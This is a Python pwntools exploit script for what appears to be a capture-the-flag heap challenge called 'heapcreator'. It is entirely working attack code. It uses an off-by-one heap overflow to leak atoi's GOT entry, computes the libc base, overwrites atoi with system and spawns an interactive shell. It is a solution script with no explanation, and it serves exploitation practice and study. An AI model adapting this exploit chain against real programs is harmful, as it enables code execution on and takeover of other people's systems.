#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./heapcreator")
    elf = ELF("./heapcreator")
    #  libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

else:
    io = remote("localhost", 9999)
    elf = ELF("./heapcreator")
    #  libc = ELF("")

def DEBUG():
	raw_input("DEBUG: ")
	gdb.attach(io)


def create(size, content):
    io.sendlineafter(" :", "1")
    io.sendlineafter(" : ", str(size))
    io.sendlineafter(":", content)

def edit(idx, content):
    io.sendlineafter(" :", "2")
    io.sendlineafter(" :", str(idx))
    io.sendlineafter(" : ", content)

def show(idx):
    io.sendlineafter(" :", "3")
    io.sendlineafter(" :", str(idx))
    
def delete(idx):
    io.sendlineafter(" :", "4")
    io.sendlineafter(" :", str(idx))

if __name__ == "__main__":
    create(0x18, "0000")
    create(0x10, "1111")

    edit(0, 'a' * 0x18 + "\x41")

    delete(1)
    payload = 4 * p64(0) + p64(0x30) + p64(elf.got["atoi"])
    create(0x30, payload)
    show(1)
    libcBase = u64(io.recvuntil("\x7f")[-6: ].ljust(8, "\x00")) - libc.symbols["atoi"]
    success("libcBase -> {:x}".format(libcBase))

    systemAddr = libcBase + libc.symbols["system"]
    edit(1, p64(systemAddr))
    io.sendlineafter(" :", "$0")

    io.interactive()
    io.close()
